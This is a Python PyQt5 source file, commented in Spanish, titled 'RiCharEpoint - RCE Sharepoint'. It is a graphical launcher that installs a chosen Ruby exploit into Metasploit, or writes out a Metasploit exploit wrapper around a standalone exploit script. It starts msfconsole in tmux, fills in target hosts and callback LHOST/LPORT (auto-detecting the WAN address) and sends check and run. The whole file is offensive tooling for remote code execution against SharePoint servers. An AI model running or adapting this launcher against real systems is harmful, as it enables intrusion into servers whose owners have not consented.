#!/usr/bin/env python3
# Creditos Cracks que desarrollaron el RB , el gordo GPT y Un Hacker En Capital
import sys, os, re, shutil, subprocess, requests
from PyQt5.QtWidgets import (
    QApplication, QWidget, QLabel, QLineEdit, QPushButton, QTextEdit,
    QHBoxLayout, QVBoxLayout, QFileDialog, QRadioButton, QButtonGroup, QGroupBox
)
from PyQt5.QtGui import QPixmap, QIcon, QFont
from PyQt5.QtCore import Qt

# =========================
# Rutas de icono y logo
# =========================
if getattr(sys, 'frozen', False):
    RUTA_ICONO = os.path.join(sys._MEIPASS, "icono.png")
    RUTA_LOGO  = os.path.join(sys._MEIPASS, "logo.png")
else:
    BASE_DIR   = os.path.dirname(os.path.abspath(__file__))
    RUTA_ICONO = os.path.join(BASE_DIR, "icono.png")
    RUTA_LOGO  = os.path.join(BASE_DIR, "logo.png")

SESSION = "msfgui"  # nombre de sesión tmux
USER_MODULE_ROOT = os.path.expanduser("~/.msf4/modules")  # raíz correcta para loadpath

# =========================
# util red
# =========================
def get_lan_ip():
    try:
        out = subprocess.check_output(["ip", "route", "get", "1.1.1.1"], text=True)
        m = re.search(r"src\s+(\d+\.\d+\.\d+\.\d+)", out)
        return m.group(1) if m else ""
    except Exception:
        return ""

def get_wan_ip():
    try:
        r = requests.get("http://ifconfig.me/ip", timeout=6)
        ip = r.text.strip()
        return ip if re.match(r"^\d+\.\d+\.\d+\.\d+$", ip) else ""
    except Exception:
        return ""

# =========================
# util msf
# =========================
def is_msf_module(rb_path: str) -> bool:
    try:
        code = open(rb_path, "r", errors="ignore").read()
        return bool(re.search(r"class\s+MetasploitModule\s*<\s*Msf::", code))
    except Exception:
        return False

def guess_module_type(rb_path: str) -> str:
    try:
        code = open(rb_path, "r", errors="ignore").read()
        if "Msf::Exploit" in code: return "exploit"
        if "Msf::Auxiliary" in code: return "auxiliary"
        if "Msf::Post" in code:     return "post"
        return "exploit"
    except Exception:
        return "exploit"

def category_dir_and_refname_prefix(mtype: str):
    """Devuelve (categoria_dir, ref_prefix) con nombres correctos."""
    if mtype == "exploit":
        return "exploits", "exploits"
    elif mtype == "auxiliary":
        return "auxiliary", "auxiliary"
    elif mtype == "post":
        return "post", "post"
    else:
        return "exploits", "exploits"

def sanitize_basename(name: str) -> str:
    base = os.path.splitext(os.path.basename(name))[0]
    base = re.sub(r"[^a-z0-9_]", "_", base.lower())
    return base if base else "module"

def ensure_root_structure():
    for sub in ("exploits", "auxiliary", "post"):
        os.makedirs(os.path.join(USER_MODULE_ROOT, sub), exist_ok=True)

def install_msf_module(rb_path: str):
    """
    Copia un .rb que YA es módulo MSF a ~/.msf4/modules/<categoria>/custom_gui/<basename>.rb
    Devuelve (refname, mod_root_for_loadpath)
    """
    ensure_root_structure()
    mtype = guess_module_type(rb_path)
    cat_dir, ref_prefix = category_dir_and_refname_prefix(mtype)
    base  = sanitize_basename(rb_path)
    target_dir = os.path.join(USER_MODULE_ROOT, cat_dir, "custom_gui")
    os.makedirs(target_dir, exist_ok=True)
    dst = os.path.join(target_dir, base + ".rb")
    shutil.copyfile(rb_path, dst)
    refname = f"{ref_prefix}/custom_gui/{base}"
    return refname, USER_MODULE_ROOT  # loadpath debe ser la raíz

def install_wrapper_for_script(rb_path: str):
    """
    Genera un módulo MSF wrapper (exploit) que invoca el script Ruby standalone
    con subcomando check/run y flags --host/--port/--vhost/--lhost/--lport.
    Instala en ~/.msf4/modules/exploits/custom_gui/<basename>_wrapper.rb
    Devuelve (refname, mod_root_for_loadpath)
    """
    ensure_root_structure()
    base  = sanitize_basename(rb_path)
    cat_dir, ref_prefix = category_dir_and_refname_prefix("exploit")
    target_dir = os.path.join(USER_MODULE_ROOT, cat_dir, "custom_gui")
    os.makedirs(target_dir, exist_ok=True)
    wrapper_name = f"{base}_wrapper"
    dst = os.path.join(target_dir, wrapper_name + ".rb")

    wrapper = f"""require 'msf/core'
require 'rbconfig'
require 'rex/text'

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {{}})
    super(update_info(info,
      'Name'           => 'Wrapper for {base} (standalone Ruby)',
      'Description'    => %q{{ Wrapper que ejecuta el script Ruby standalone para check/run. }},
      'License'        => MSF_LICENSE,
      'Author'         => [ 'GUI-Wrapper' ],
      'References'     => [],
      'Platform'       => 'win',
      'Arch'           => ARCH_X64,
      'Targets'        => [ [ 'Auto', {{}} ] ],
      'DefaultTarget'  => 0
    ))

    register_options(
      [
        Opt::RHOSTS(),
        Opt::RPORT(80),
        OptString.new('VHOST', [ false, 'Virtual host header', nil ]),
        Opt::LHOST(),
        Opt::LPORT(4444),
        OptString.new('STANDALONE_PATH', [ true, 'Ruta al script Ruby standalone', File.expand_path('{rb_path}') ])
      ]
    )
  end

  def run_script(subcmd)
    ruby = Rex::Text.shellescape(RbConfig.ruby)
    scr  = Rex::Text.shellescape(datastore['STANDALONE_PATH'])
    cmd  = []
    cmd << ruby
    cmd << scr
    cmd << subcmd
    cmd << "--host" << Rex::Text.shellescape(rhosts)
    cmd << "--port" << Rex::Text.shellescape(rport.to_s)
    v = datastore['VHOST']
    cmd << "--vhost" << Rex::Text.shellescape(v) if v && !v.empty?
    lh = datastore['LHOST']; lp = datastore['LPORT']
    cmd << "--lhost" << Rex::Text.shellescape(lh) if lh && !lh.empty?
    cmd << "--lport" << Rex::Text.shellescape(lp.to_s) if lp

    print_status("Ejecutando: {{#{'{'}cmd.join(' '){'}'}}}")
    out = `{{#{'{'}cmd.join(' '){'}'}}} 2>&1`
    vprint_line(out)
    out
  end

  def check
    out = run_script('check')
    return CheckCode::Vulnerable if out =~ /VULNERABLE|SUCCESS|OK/i
    return CheckCode::Detected if out && !out.empty?
    CheckCode::Unknown
  end

  def exploit
    out = run_script('run')
    print_good("Salida script:\\n{{#{'{'}out{'}'}}}")
  end
end
"""
    with open(dst, "w") as f:
        f.write(wrapper)

    refname = f"{ref_prefix}/custom_gui/{wrapper_name}"  # => exploits/custom_gui/<base>_wrapper
    return refname, USER_MODULE_ROOT  # loadpath debe ser la raíz

# =========================
# util terminal
# =========================
def which(cmd):
    return shutil.which(cmd) is not None

def pick_terminal_cmd():
    # prioridad: x-terminal-emulator (Debian/Ubuntu/Kali), gnome-terminal, xfce4-terminal, xterm
    if which("x-terminal-emulator"):
        return ["x-terminal-emulator", "-e"]
    if which("gnome-terminal"):
        return ["gnome-terminal", "--"]
    if which("xfce4-terminal"):
        return ["xfce4-terminal", "-e"]
    if which("xterm"):
        return ["xterm", "-e"]
    return None

# =========================
# util tmux
# =========================
def tmux_session_exists(session):
    r = subprocess.run(["tmux", "has-session", "-t", session], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    return r.returncode == 0

def tmux_kill_session(session):
    subprocess.run(["tmux", "kill-session", "-t", session], stdout=subprocess.PIPE, stderr=subprocess.PIPE)

def tmux_new_session(session, cmd):
    env = os.environ.copy()
    env["MSF_DISABLE_COLORS"] = "1"
    return subprocess.run(["tmux", "new-session", "-d", "-s", session, cmd], env=env).returncode == 0

def tmux_send(session, line):
    subprocess.run(["tmux", "send-keys", "-t", session, line, "Enter"])

def open_terminal_attached(session):
    term = pick_terminal_cmd()
    if term is None:
        return False
    full = term + ["tmux", "attach", "-t", session]
    subprocess.Popen(full)
    return True

# =========================
# GUI
# =========================
class App(QWidget):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("RiCharEpoint - RCE Sharepoint")
        self.setWindowIcon(QIcon(RUTA_ICONO))  # ICONO EN BARRA
        self.resize(1000, 600)

        self._pix_banner = QPixmap(RUTA_LOGO)

        main_layout = QVBoxLayout()

        # ---------- Banner (igual estilo LLMTroy) ----------
        self.banner = QLabel()
        self.banner.setAlignment(Qt.AlignCenter)
        self._set_banner_scaled()
        main_layout.addWidget(self.banner)

        header = QLabel("RiCharEpoint - Ejecutor GUI para módulo RCE Sharepoint")
        header.setFont(QFont("Courier", 14, QFont.Bold))
        header.setAlignment(Qt.AlignCenter)
        main_layout.addWidget(header)

        # ---------- Campos y controles ----------
        self.rb_path = QLineEdit()
        self.rb_path.setPlaceholderText("Seleccioná el archivo .rb (módulo MSF o script Ruby)")
        self.btn_rb = QPushButton("Seleccionar .rb")
        self.btn_rb.clicked.connect(self.pick_rb)

        top = QHBoxLayout()
        top.addWidget(QLabel("Módulo Exploit:"))
        top.addWidget(self.rb_path, 1)
        top.addWidget(self.btn_rb)
        main_layout.addLayout(top)

        self.rhosts = QLineEdit()
        self.rhosts.setPlaceholderText("RHOSTS ej: 192.168.0.231")
        self.rport = QLineEdit("80")
        self.vhost = QLineEdit()
        self.vhost.setPlaceholderText("VHOST (opcional)")

        line1 = QHBoxLayout()
        line1.addWidget(QLabel("RHOSTS:")); line1.addWidget(self.rhosts, 1)
        line1.addWidget(QLabel("RPORT:"));  line1.addWidget(self.rport)
        line1.addWidget(QLabel("VHOST:"));  line1.addWidget(self.vhost, 1)
        main_layout.addLayout(line1)

        self.lhost = QLineEdit()
        self.lhost.setPlaceholderText("Detectado automáticamente")
        self.lport = QLineEdit("4444")
        self.rb_lan = QRadioButton("LAN"); self.rb_lan.setChecked(True)
        self.rb_wan = QRadioButton("WAN")
        self.rb_group = QButtonGroup(self); self.rb_group.addButton(self.rb_lan); self.rb_group.addButton(self.rb_wan)
        self.btn_detect = QPushButton("Detectar LHOST"); self.btn_detect.clicked.connect(self.detect_lhost)

        lrow = QHBoxLayout()
        lrow.addWidget(QLabel("LHOST:")); lrow.addWidget(self.lhost, 1)
        lrow.addWidget(QLabel("LPORT:")); lrow.addWidget(self.lport)
        lrow.addWidget(self.rb_lan); lrow.addWidget(self.rb_wan); lrow.addWidget(self.btn_detect)
        lgroup = QGroupBox("Red"); lgroup.setLayout(lrow)
        main_layout.addWidget(lgroup)

        self.output = QTextEdit(); self.output.setReadOnly(True)

        self.btn_start  = QPushButton("Iniciar msfconsole")
        self.btn_setup  = QPushButton("Inyectar módulo")
        self.btn_setg   = QPushButton("Setear variables")
        self.btn_check  = QPushButton("Check")
        self.btn_run    = QPushButton("Run")

        self.btn_start.clicked.connect(self.start_msf)
        self.btn_setup.clicked.connect(self.setup_module_or_wrapper)
        self.btn_setg.clicked.connect(self.set_globals)
        self.btn_check.clicked.connect(lambda: tmux_send(SESSION, "check"))
        self.btn_run.clicked.connect(lambda: tmux_send(SESSION, "run"))

        ctrl = QHBoxLayout()
        ctrl.addWidget(self.btn_start)
        ctrl.addWidget(self.btn_setup)
        ctrl.addWidget(self.btn_setg)
        ctrl.addStretch(1)
        ctrl.addWidget(self.btn_check)
        ctrl.addWidget(self.btn_run)
        main_layout.addLayout(ctrl)

        main_layout.addWidget(QLabel("Log:"))
        main_layout.addWidget(self.output, 1)

        self.setLayout(main_layout)
        self.detect_lhost()

    # ----- Banner responsive -----
    def _set_banner_scaled(self):
        if self._pix_banner and not self._pix_banner.isNull():
            # Escala a 600px o al ancho disponible (ventana - 80), lo que sea menor (con mínimo 300)
            max_w = min(600, max(300, self.width() - 80))
            self.banner.setPixmap(self._pix_banner.scaledToWidth(max_w, Qt.SmoothTransformation))

    def resizeEvent(self, event):
        super().resizeEvent(event)
        self._set_banner_scaled()

    # ----- Helpers GUI -----
    def log(self, msg): 
        self.output.append(msg)

    def pick_rb(self):
        path, _ = QFileDialog.getOpenFileName(self, "Elegir .rb", os.getcwd(), "Ruby (*.rb);;Todos (*)")
        if path: self.rb_path.setText(path)

    def detect_lhost(self):
        ip = get_lan_ip() if self.rb_lan.isChecked() else get_wan_ip()
        if ip:
            self.lhost.setText(ip); self.log(f"[i] LHOST: {ip}")
        else:
            self.lhost.setText(""); self.log("[!] No se pudo detectar LHOST")

    # ----- Acciones -----
    # 1) Arranca msfconsole en tmux y abre una terminal “normal”
    def start_msf(self):
        if tmux_session_exists(SESSION):
            tmux_kill_session(SESSION)
        ok = tmux_new_session(SESSION, "MSF_DISABLE_COLORS=1 msfconsole -q")
        if not ok:
            self.log("[!] No se pudo crear la sesión tmux/msfconsole. ¿Instalaste tmux?")
            return
        self.log("[i] msfconsole arrancado en tmux. Abriendo terminal…")
        opened = open_terminal_attached(SESSION)
        if not opened:
            self.log("[!] No se pudo abrir terminal; podés usar:  tmux attach -t msfgui")
        else:
            self.log("[i] Terminal abierta y adjunta a la sesión.")

    # 2) Si el .rb es módulo, lo instala; si no, genera wrapper y lo usa
    def setup_module_or_wrapper(self):
        if not tmux_session_exists(SESSION):
            self.log("[!] msfconsole no está corriendo. Primero 'Iniciar msfconsole'.")
            return

        rb = self.rb_path.text().strip()
        if not rb or not os.path.isfile(rb):
            self.log("[!] Seleccioná un .rb válido.")
            return

        try:
            if is_msf_module(rb):
                refname, mod_root = install_msf_module(rb)
                self.log(f"[i] Módulo instalado como {refname} en {mod_root}")
            else:
                refname, mod_root = install_wrapper_for_script(rb)
                self.log(f"[i] Wrapper generado como {refname} en {mod_root}")
        except Exception as e:
            self.log(f"[!] Error instalando/generando módulo: {e}")
            return

        # loadpath (a la raíz correcta) + reload_all + use <refname>
        tmux_send(SESSION, f"loadpath {mod_root}")
        tmux_send(SESSION, "reload_all")
        tmux_send(SESSION, f"use {refname}")
        self.log(f"[i] use {refname} enviado. Si no cambia el prompt, mirá la consola por errores.")

    # 3) Setear variables globales
    def set_globals(self):
        if not tmux_session_exists(SESSION):
            self.log("[!] msfconsole no está corriendo.")
            return
        rhosts = self.rhosts.text().strip()
        rport  = self.rport.text().strip()
        lhost  = self.lhost.text().strip()
        lport  = self.lport.text().strip()
        vhost  = self.vhost.text().strip()
        if not rhosts or not rport.isdigit() or not lhost or not lport.isdigit():
            self.log("[!] Completá RHOSTS/RPORT/LHOST/LPORT (numéricos donde aplique).")
            return
        tmux_send(SESSION, f"setg RHOSTS {rhosts}")
        tmux_send(SESSION, f"setg RPORT {rport}")
        tmux_send(SESSION, f"setg LHOST {lhost}")
        tmux_send(SESSION, f"setg LPORT {lport}")
        if vhost:
            tmux_send(SESSION, f"setg VHOST {vhost}")
        self.log("[i] Variables seteadas en msfconsole.")

# =========================
# MAIN
# =========================
if __name__ == "__main__":
    # Íconos nítidos en HiDPI y nombre de app
    QApplication.setAttribute(Qt.AA_UseHighDpiPixmaps, True)
    app = QApplication(sys.argv)
    app.setApplicationName("RiCharEpoint - RCE Sharepoint")
    app.setWindowIcon(QIcon(RUTA_ICONO))  # icono global de la app

    w = App()
    w.show()
    sys.exit(app.exec_())
